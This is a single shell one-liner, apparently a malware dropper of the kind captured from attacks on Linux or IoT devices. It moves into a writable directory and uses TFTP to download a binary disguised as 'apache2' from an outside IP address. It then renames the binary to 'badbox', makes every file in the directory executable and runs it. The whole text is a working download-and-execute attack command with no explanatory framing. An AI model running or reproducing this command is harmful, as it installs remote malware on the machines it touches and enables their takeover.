cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 50.115.166.170;cat apache2 >badbox;chmod +x *;./badbox
